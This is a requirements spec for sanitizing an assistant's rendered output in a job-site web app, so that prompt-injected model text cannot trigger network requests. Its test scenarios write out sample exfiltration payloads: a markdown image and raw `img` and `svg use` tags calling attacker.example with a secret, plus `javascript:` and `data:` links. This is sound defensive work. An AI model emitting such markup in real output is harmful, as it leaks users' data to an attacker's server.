## MODIFIED Requirements

### Requirement: Assistant model output renders as inert markup

Every SPA surface that renders untrusted model prose as markup — the assistant's answer body and
thinking block, and the fit-analysis verdict card — SHALL run that text through a sanitizer policy
that strips every element and URI scheme capable of triggering a network request or executing
code. Model output is untrusted: the model reads job descriptions, arbitrary browsed pages, and
other text an attacker controls end to end, so anything it writes may be an attacker's words in the
model's mouth.

The policy MUST drop `img`, `picture`, `source`, `video`, `audio`, `iframe`, `object`, `embed`,
`form`, `svg`, and `use`, and MUST admit only the `http`, `https`, and `mailto` URI schemes plus
relative URLs. It applies to every such sink and to partial output during streaming, not only to
settled content. This mirrors the ban the ingest sanitizer already applies to job description HTML,
and for the same reason: a rendered image is a request the viewer never asked to make.

Ordinary prose formatting is unaffected: headings, lists, tables, emphasis, code, and links still
render, and links the model writes still open in a new tab.

#### Scenario: A markdown image never reaches the DOM

- **WHEN** the model writes `![x](https://attacker.example/leak?d=secret)` in its answer
- **THEN** the rendered markup contains no `img` element and the browser issues no request to that host

#### Scenario: Raw HTML media is dropped too

- **WHEN** the model writes a literal `<img src="https://attacker.example/p.gif">` or `<svg><use href="https://attacker.example/u">`
- **THEN** both are removed from the rendered markup

#### Scenario: The thinking block is sanitized on the same policy

- **WHEN** model output containing an image reaches the thinking block rather than the answer body
- **THEN** it is stripped there as well

#### Scenario: A request fires from no partially streamed answer

- **WHEN** an answer carrying an image arrives token by token and is re-rendered on each update
- **THEN** no intermediate render emits the image

#### Scenario: A non-http scheme is refused

- **WHEN** the model writes a link whose scheme is `javascript:` or `data:`
- **THEN** the rendered anchor does not carry that URI

#### Scenario: A relative link keeps its target

- **WHEN** the model writes a link to `/my/profile`, `#section`, or `jobs/go-dev`
- **THEN** the anchor keeps that href — a relative URL is same-origin by definition and carries nothing off the site

#### Scenario: Ordinary formatting survives

- **WHEN** the model writes headings, a bullet list, bold text, a code block, and an `https` link
- **THEN** all of them render, and the link carries `target="_blank"` and `rel="noopener noreferrer"`

#### Scenario: The fit verdict uses the same policy

- **WHEN** a fit-analysis recommendation containing a markdown image is rendered on the analysis page
- **THEN** the verdict card contains no `img` element and the browser issues no request to that host
